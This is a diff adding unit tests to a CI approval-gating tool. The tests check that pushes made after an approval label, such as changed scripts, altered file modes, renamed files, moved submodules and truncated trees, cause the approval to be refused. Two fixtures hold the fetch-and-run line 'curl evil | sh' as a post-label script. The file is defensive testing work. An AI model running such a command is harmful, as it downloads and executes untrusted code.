@@ -122,9 +122,12 @@ class Forge:
         for commit, at in self.states.items():
             if path == f"repos/{REPO}/git/trees/{commit}":
                 return {"tree": [{"path": "src", "type": "tree", "mode": "040000", "sha": "f" * 40},
-                                 {"path": ".github", "type": "tree", "mode": "040000", "sha": f"{at}" * 40}],
+                                 {"path": ".github", "type": "tree", "mode": "040000", "sha": f"e{at}" * 20}],
                         "truncated": f"root{at}" in self.truncated}
-            if path == f"repos/{REPO}/git/trees/{str(at) * 40}?recursive=1":
+            if path == f"repos/{REPO}/git/trees/{commit}?recursive=1":
+                whole = [*self.tree(at), {"path": "src", "type": "tree", "mode": "040000", "sha": "f" * 40}]
+                return {"tree": whole, "truncated": f"whole{at}" in self.truncated}
+            if path == f"repos/{REPO}/git/trees/{f'e{at}' * 20}?recursive=1":
                 inside = [dict(e, path=e["path"].removeprefix(".github/")) for e in self.tree(at)
                           if e["path"].startswith(".github/")]
                 inside.append({"path": "workflows", "type": "tree", "mode": "040000", "sha": "e" * 40})
@@ -336,8 +339,8 @@ class Approved(unittest.TestCase):
 
     def test_a_push_that_changes_the_change_after_the_label_fails(self):
         forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: y\n")
-        self.refused(forge, f"what {HEAD[:8]} changes under .github/workflows/ and .github/actions/ is not what "
-                            f"{EARLIER[:8]} changed when `{pin_only.APPROVED}` was added at {at(3)}")
+        self.refused(forge, f"what {HEAD[:8]} changes is not what {EARLIER[:8]} changed when "
+                            f"`{pin_only.APPROVED}` was added at {at(3)}")
 
     def test_a_rebase_that_keeps_the_change_keeps_the_approval(self):
         # The same lines removed and added, with the same lines around them, on a
@@ -364,6 +367,96 @@ class Approved(unittest.TestCase):
         forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: x\n")
         forge.files[".github/workflows/new.yml"] = (None, "on: push\n", None, "on: pull_request\n")
         self.refused(forge, "is not what")
+
+    # Each way a push after the label could change what the approved checks run while
+    # leaving `.github/` as it was, or change `.github/` in a way a reading by lines misses.
+
+    EXTRA = caller() + "  extra:\n    runs-on: x\n"
+
+    def with_file(self, path: str, base: str | None, then: str | None, now: str | None,
+                  modes: tuple[str, str, str, str] | None = None) -> Forge:
+        """`earlier` with one more path, at (merge base, head, earlier base, earlier head)."""
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.files[path] = (base, now, base, then)
+        for state, mode in enumerate(modes or ()):
+            forge.modes[(path, state)] = mode
+        return forge
+
+    def test_a_script_outside_github_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "echo a\n", "echo b\n", "curl evil | sh\n"), "is not what")
+
+    def test_a_script_outside_github_left_as_approved_keeps_the_approval(self):
+        self.assertEqual(run(self.with_file("scripts/x.sh", "echo a\n", "echo b\n", "echo b\n"))[0], 0)
+
+    def test_a_script_added_outside_github_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/y.sh", None, None, "curl evil | sh\n"), "is not what")
+
+    def test_only_line_endings_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "a\n", "a\nb\n", "a\nb\r\n"), "is not what")
+
+    def test_only_the_last_newline_changed_after_the_label_fails(self):
+        self.refused(self.with_file("scripts/x.sh", "a\n", "a\nb\n", "a\nb"), "is not what")
+
+    def test_a_script_made_executable_after_the_label_fails(self):
+        forge = self.with_file("scripts/x.sh", "a\n", "b\n", "b\n", ("100644", "100755", "100644", "100644"))
+        self.refused(forge, "is not what")
+
+    def test_a_file_renamed_after_the_label_fails(self):
+        forge = self.with_file("scripts/x.sh", None, "a\n", None)
+        forge.files["scripts/z.sh"] = (None, "a\n", None, None)
+        self.refused(forge, "is not what")
+
+    def test_a_submodule_moved_differently_after_the_label_fails(self):
+        forge = self.with_file("vendor/lib", "one", "two", "three", ("160000",) * 4)
+        self.refused(forge, "is not what")
+
+    def test_a_submodule_main_moved_under_an_unchanged_change_fails(self):
+        # The same pointer at the head, from another base: compared by the objects it
+        # names, never by a diff of text it does not have.
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.files["vendor/lib"] = ("moved", "two", "one", "two")
+        for state in range(4):
+            forge.modes[("vendor/lib", state)] = "160000"
+        self.refused(forge, "is not what")
+
+    def test_a_file_that_is_not_text_is_another_change(self):
+        forge = self.with_file("scripts/x.bin", "a", "b", "c")
+        real = forge.__call__
+
+        def binary(args, raw):
+            if raw and args[0].endswith(f"/git/blobs/{blob('c')}"):
+                raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")
+            return real(args, raw)
+
+        code, said = run(binary)
+        self.assertEqual(code, 1, said)
+        self.assertIn("is not what", said)
+
+    def test_a_base_changed_after_the_label_fails(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.timeline.append({"event": "base_ref_changed", "created_at": at(4)})
+        self.refused(forge, f"its base was changed at {at(4)}, after `{pin_only.APPROVED}` was added at {at(3)}")
+
+    def test_a_base_changed_before_the_label_is_the_base_approved(self):
+        forge = self.earlier(caller().replace("name: ci", "name: ci\nrun-name: older"),
+                             caller().replace("name: ci", "name: ci\nrun-name: older") + "  extra:\n    runs-on: x\n")
+        forge.timeline.insert(0, {"event": "base_ref_changed", "created_at": at(2)})
+        self.assertEqual(run(forge)[0], 0)
+
+    def test_a_tree_the_forge_answers_in_part_approves_nothing(self):
+        forge = self.earlier(caller(), self.EXTRA)
+        forge.truncated.add("whole3")
+        code, said = run(forge)
+        self.assertEqual(code, 2, said)
+        self.assertIn("came back truncated", said)
+
+    def test_what_the_pull_request_says_approves_nothing(self):
+        # Nothing the author writes is read as the approval: not the body, not a
+        # comment, not a file. The approved change is read from the forge each time.
+        forge = self.earlier(caller(), caller() + "  extra:\n    runs-on: y\n")
+        forge.files[".github/approved.txt"] = (None, "approved: " + EARLIER, None, None)
+        self.refused(forge, "is not what")
+        self.assertFalse([a for a in forge.asked if "/comments" in a[0] or "/contents/" in a[0]])
 
     def test_runs_at_the_same_moment_on_two_heads_name_no_approved_head(self):
         forge = self.changed()
@@ -724,6 +817,19 @@ class CannotRead(unittest.TestCase):
         self.assertEqual(code, 2)
         self.assertIn("could not be read", said)
         self.assertIn("HTTP 404", said)
+
+    def test_a_workflow_file_that_is_not_text_is_a_failure_not_a_pass(self):
+        forge = Forge({CI: (caller(), caller() + "x")})
+        real = forge.__call__
+
+        def binary(args, raw):
+            if raw:
+                raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")
+            return real(args, raw)
+
+        code, said = run(binary)
+        self.assertEqual(code, 2, said)
+        self.assertIn("could not be read", said)
 
     def test_an_answer_of_another_shape(self):
         code, said = run(lambda args, raw: {})
